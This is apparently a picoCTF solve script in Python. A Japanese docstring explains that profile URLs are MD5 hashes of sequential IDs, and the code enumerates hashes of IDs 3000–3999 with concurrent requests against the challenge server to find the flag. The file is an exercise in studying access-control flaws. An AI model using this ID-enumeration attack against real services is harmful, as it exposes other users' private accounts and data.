import asyncio

import aiohttp
from hashlib import md5

"""
ソースを見ると guest アカウントの認証情報がある
入力すると /profile/user/e93028bdc1aacdfb3687181f2031765d に飛ばされる
https://md5hashing.net/hash/md5/e93028bdc1aacdfb3687181f2031765d を見ると `3000` のハッシュだとわかる
"""


async def try_sess_id(session: aiohttp.ClientSession, sess_id: str) -> bool:
    sess_tag = md5(sess_id.encode()).hexdigest().lower()
    async with session.get(
        f"http://crystal-peak.picoctf.net:58675/profile/user/{sess_tag}"
    ) as response:
        content = await response.text()
        if "picoCTF{" in content:
            print(f"Found flag with sess_id={sess_id}: {content}")
            return True
        if "User not found" in content:
            return False

        print(f"Unexpected response for sess_id={sess_id}: {content}")
        return False


async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(3000, 4000):
            sess_id = f"{i:03d}"
            tasks.append(try_sess_id(session, sess_id))

        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
